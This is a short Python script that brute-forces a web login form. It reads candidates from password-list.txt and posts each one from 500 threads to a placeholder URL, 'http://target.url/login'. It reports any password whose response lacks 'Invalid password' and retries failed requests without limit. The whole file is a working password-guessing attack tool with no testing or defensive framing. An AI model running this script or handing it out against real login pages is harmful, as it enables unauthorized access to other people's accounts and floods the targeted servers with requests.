#!/usr/bin/env python3
import socket
import pickle
## For CPU intensive tasking, don't use dummy. Dummy is threading, which is only run on one core of your CPU.
from multiprocessing.dummy import Pool as ThreadPool 
import requests

def thread_starter():
    with open('password-list.txt', 'r') as f:
        passwords = f.read().splitlines()
    pool = ThreadPool(500)
    results = pool.map(start, passwords)
    pool.close()
    pool.join()

def start(password):
    password = password.strip()
    try:
        r = requests.post("http://target.url/login", data={'password':password})
        if 'Invalid password' in r.text:
            print("Tried password " + password + ". Did not work.")
        else:
            print("### Password is: " + password + " ### ")
            print(r.text)
    except Exception as e:
        print("Hit exception: " + str(e) + " on password: " + password + ". Retrying.")
        start(password)
if __name__ == '__main__':
    thread_starter()
